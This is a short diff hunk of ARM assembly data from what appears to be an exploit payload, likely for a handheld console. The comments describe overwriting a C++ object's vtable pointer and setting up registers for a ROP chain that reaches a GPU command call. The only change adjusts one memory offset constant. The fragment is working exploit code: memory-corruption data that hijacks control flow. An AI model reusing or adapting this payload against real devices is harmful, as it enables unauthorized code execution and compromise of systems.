@@ -34,7 +34,7 @@ additionaldata_start:
 .word ADDITIONALDATA_ADR+0x20 @ additionaldata+0x10. Beginning of data which overwrites the c++ object. The ptr here overwrites the vtable ptr, therefore the vtable addr is overwritten with <addr of additionaldata+0x20>. (r0)
 .word 0x1FF80040 @ additionaldata+0x18 / object+0x4. (r1)
 .word 0xffffffff @ r2
-.word TEXT_APPMEM_OFFSET - 0x1000 + 0xD0000000 @ r3
+.word TEXT_APPMEM_OFFSET - 0x10000 + 0xD0000000 @ r3
 .word 0xffffffff @ r4 (additonaldata+0x24)
 .word GXLOWCMD4_DSTADR_PTR @ r5 (address used with the "ldr r1, [r5]" by ROP_LDRR1R5_MOVR0R8_BLXR7, before the GXLOW_CMD4 call)
 .word 0xffffffff @ r6
